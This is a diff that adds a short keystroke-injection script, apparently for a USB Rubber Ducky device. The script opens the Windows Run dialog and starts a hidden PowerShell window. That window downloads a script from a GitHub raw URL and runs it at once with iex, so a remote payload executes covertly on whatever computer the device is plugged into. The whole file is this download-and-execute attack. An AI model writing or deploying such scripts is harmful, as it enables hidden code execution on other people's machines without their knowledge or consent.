@@ -1,0 +1,6 @@
+DELAY 1000
+GUI r
+DELAY 250
+STRING powershell -windowstyle hidden iex (wget https://raw.githubusercontent.com/gadd1/Ducky_desktop/master/desktop.ps1)
+ENTER
+
